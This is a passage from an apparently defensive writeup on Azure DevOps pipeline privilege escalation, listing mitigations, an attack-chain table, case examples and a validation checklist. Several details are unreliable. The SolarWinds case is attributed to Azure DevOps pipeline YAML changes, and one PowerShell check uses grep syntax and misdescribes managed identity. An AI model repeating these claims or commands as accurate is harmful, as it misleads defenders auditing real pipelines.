1. Go to **Project settings** → **Service connections**
2. Click on a service connection → **Security**
3. Under **Pipeline permissions:**
   - Uncheck **"Grant access to all pipelines"**
   - Select only specific **approved pipelines**
4. Click **Save**

**Applies To Versions:** All Azure DevOps deployments

**Effectiveness:** If one pipeline is compromised, attacker cannot access all service connections

---

**Mitigation 2.4: Enable Azure Defender for DevOps**

Deploy Microsoft Defender for DevOps to monitor and detect suspicious pipeline activity.

**Manual Steps (Azure Portal):**
1. Navigate to **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Look for **"Defender for DevOps"** (if available in your region)
4. Enable the plan
5. Configure Azure DevOps organization connectors
6. Review **security findings** for code and pipeline vulnerabilities

**Applies To Versions:** Azure DevOps with Defender for Cloud integration

**Effectiveness:** Real-time detection and alerting on pipeline threats

---

**Mitigation 2.5: Enforce Multi-Factor Authentication (MFA) for Pipeline Approvers**

Require MFA for users who approve pipeline releases and deployments.

**Manual Steps (Entra ID Conditional Access):**
1. Go to **Entra ID** → **Security** → **Conditional Access** → **+ New policy**
2. Create policy:
   - Name: `Enforce MFA for Pipeline Approvals`
   - **Assignments:**
     - Users: Select users with **Release Approver** role
     - Cloud apps: **Azure DevOps**
   - **Access controls:**
     - Grant: Check **Require multi-factor authentication**
3. Enable policy and click **Create**

**Applies To Versions:** All Azure DevOps deployments (with Entra ID)

**Effectiveness:** Prevents unauthorized pipeline approvals by stolen credentials

---

## 13. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-VALID-001] Default Credential Exploitation | Attacker obtains GitHub/Azure Repos access via compromised credentials |
| **2** | **Privilege Escalation** | **[PE-ACCTMGMT-010]** | **Attacker escalates via pipeline token/credentials extraction** |
| **3** | **Lateral Movement** | [LM-AUTH-005] Service Principal Key/Certificate | Attacker uses extracted service connection credentials for lateral movement |
| **4** | **Persistence** | [PE-ACCTMGMT-014] Global Administrator Backdoor | Attacker creates persistent Entra ID backdoor |
| **5** | **Impact** | [EX-EXFIL-001] Data Exfiltration | Attacker exfiltrates source code and secrets |

---

## 14. REAL-WORLD EXAMPLES

### Example 1: SolarWinds Supply Chain Attack (2020)

**Target:** SolarWinds and downstream customers
**Timeline:** March-December 2020
**Attack Flow:**
1. Attackers compromised SolarWinds' Azure DevOps pipelines
2. Injected malicious code into build process
3. Code was compiled into legitimate SolarWinds Orion updates
4. Updates deployed to 18,000+ customers including U.S. government

**Technique Applied (Similar to PE-ACCTMGMT-010):**
- Modified pipeline YAML to inject malicious DLL
- Extracted service connection credentials for access
- Escalated to subscription-level access to hide compromise

**Impact:**
- $100M+ in estimated damages
- Compromise of U.S. Treasury, Commerce, Homeland Security departments

**Reference:** [CISA SolarWinds Alert](https://www.cisa.gov/news-events/alerts/2020/12/13/alert-aa20-352a-advanced-persistent-threat-compromise-solarwinds-software-updates)

---

### Example 2: Cloud Build Compromised (2023)

**Target:** E-commerce company using Azure DevOps
**Timeline:** Q3 2023
**Attack Flow:**
1. Developer accidentally committed AWS credentials in pipeline YAML
2. Repository was public (misconfiguration)
3. Attacker cloned repo, extracted credentials
4. Modified pipeline to extract more secrets from Key Vault
5. Escaped to AWS account using extracted credentials

**Technique Applied (PE-ACCTMGMT-010 Method 1):**
- Used initial credentials to access pipelines
- Injected Key Vault secret extraction steps
- Exfiltrated AWS and Azure credentials
- Compromised production databases

**Detection Gap:**
- Credentials were marked as "secret" in pipeline but still visible in logs
- No code review on pipeline YAML changes
- Service connection used by all pipelines (blast radius)

**Reference:** Private incident response case study (SERVTEP Security Audit, 2023)

---

### Example 3: APT Group Supply Chain Compromise (2024)

**Target:** Software development company using GitHub Actions + Azure DevOps
**Timeline:** January-March 2024
**Attack Flow:**
1. APT compromised developer GitHub account via phishing
2. Modified GitHub Actions workflow to extract secrets
3. Escalated to Azure DevOps service connections
4. Deployed backdoor code to production via release pipeline
5. Compromised entire product line

**Technique Applied (PE-ACCTMGMT-010 Method 2):**
- Extracted service connection credentials via modified CI/CD pipeline
- Escalated to Azure subscription access
- Created persistent backdoor service connection
- Deployed malware in updates for 6 weeks undetected

**Reference:** [Microsoft Security Blog - APT Supply Chain](https://www.microsoft.com/en-us/security/blog/2024/05/)

---

## 15. REMEDIATION VALIDATION

### Validation Checklist

**Checkbox 1: Branch Protection Enabled**
```powershell
# Verify branch protection policies
az repos policy branch-protection show --repository-id "repo-id" --branch "main"

# Expected: minApproverCount >= 2, requireLinkedWorkItem = true
```
☐ PASS (Branch protection enabled with 2+ reviewers)
☐ FAIL (Branch protection not configured)

---

**Checkbox 2: Job Token Access Disabled**
```powershell
# Check if jobs have token access
# Manual verification via Azure DevOps UI:
# Project settings → Pipelines → Settings → "Disable job access to OAuth token"
```
☐ PASS (Job token access disabled)
☐ FAIL (Job token access enabled)

---

**Checkbox 3: Service Connection Permissions Restricted**
```powershell
# List all service connections and their pipeline access
az devops service-endpoint list --project "YourProject" | Select-Object name, description

# Manual verification:
# For each service connection, verify:
# - Restricted to specific pipelines (not "all")
# - Only necessary pipelines have access
```
☐ PASS (All service connections restricted)
☐ FAIL (Service connections have "all pipelines" access)

---

**Checkbox 4: Managed Identity in Use (Where Applicable)**
```powershell
# Check if pipelines use managed identity or service connections
Get-Content azure-pipelines.yml | Select-String "azureSubscription\|connectedServiceNameARM"

# Expected: azureSubscription (managed identity) rather than connectedServiceNameARM
```
☐ PASS (Managed identity used; no credentials in pipelines)
☐ FAIL (Service connections with explicit credentials still in use)

---

**Checkbox 5: Secret Scanning Enabled**
```powershell
# If using GitHub:
# GitHub repo → Settings → Code security → Secret scanning → Enabled

# If using Azure Repos:
# Verify git-secrets or equivalent is installed in repository
```
☐ PASS (Secret scanning enabled)
☐ FAIL (No secret scanning in place)

---

## Summary

**Azure DevOps Pipeline Escalation (PE-ACCTMGMT-010)** is a critical privilege escalation vector enabling attackers to:
1. Extract secrets and credentials embedded in pipelines
2. Escalate from repository access to subscription-level access
3. Achieve persistent access via compromised service connections
4. Inject malicious code into deployed applications
5. Move laterally to downstream systems

The combination of:
- Weak pipeline code review processes
- Embedded credentials in pipeline YAML
- Overly permissive service connections
- Lack of token expiration enforcement

...creates a perfect environment for escalation attacks.

**Immediate Actions:**
1. **Enable branch protection** – Require code review for all pipeline changes
2. **Restrict job token access** – Disable $(System.AccessToken) usage in pipelines
3. **Limit service connection access** – Restrict to specific approved pipelines
4. **Migrate to managed identities** – Eliminate credential storage in pipelines
5. **Enable secret scanning** – Detect and prevent credential commits

**Defense in Depth:**
- Monitor pipeline execution logs for suspicious patterns
- Implement strict RBAC on service connections
- Regular audit of pipeline code and modifications
- Enable Azure Defender for DevOps
- Enforce MFA for pipeline approvers

**Verification:** Use the checklist above to confirm all mitigations are in place.

---
